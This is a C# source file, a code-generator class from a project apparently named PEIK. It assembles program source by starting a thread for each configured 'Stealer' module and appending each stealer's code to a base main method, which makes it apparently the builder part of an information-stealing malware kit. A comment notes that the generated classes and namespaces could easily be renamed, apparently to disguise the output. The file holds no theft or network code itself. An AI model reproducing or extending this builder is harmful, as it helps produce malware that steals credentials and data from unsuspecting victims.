#region Includes

using System;
using System.Collections.Generic;
using System.Text;

#endregion

namespace PEIK.Util.Code_Generation
{
    class CodeGenerator
    {
        public List<Stealer> Stealers { get; set; }
        public string[] BaseMethods { get; set; }
        public string BaseMain { get; set; }

        //Basic Generation
        //Note: it would be incredibly easy to rename classes and namespaces here
        public string[] GetSource()
        {
            StringBuilder stealerThreads = new StringBuilder();
            foreach (Stealer stealer in Stealers)
            {
                stealerThreads.AppendLine(string.Format("StealerThread {0} = new StealerThread(new {1}({2}), {3});{0}.Start();", stealer.Name.ToLower(), stealer.Name, stealer.Parameters, stealer.Delay));
            }

            string[] source = new string[Stealers.Count + BaseMethods.Length + 1];
            //main method
            source[0] = BaseMain.Replace("{StealerThreads}", stealerThreads.ToString());
            //BaseMethodd
            int iSource = 1;
            for (int i = 0; i < BaseMethods.Length; i++)
            {
                source[iSource] = BaseMethods[i];
                iSource++;
            }
            //Stealers
            for (int i = 0; i < Stealers.Count; i++)
            {
                source[iSource] = Stealers[i].Source;
                iSource++;
            }

            return source;
        }
    }
}
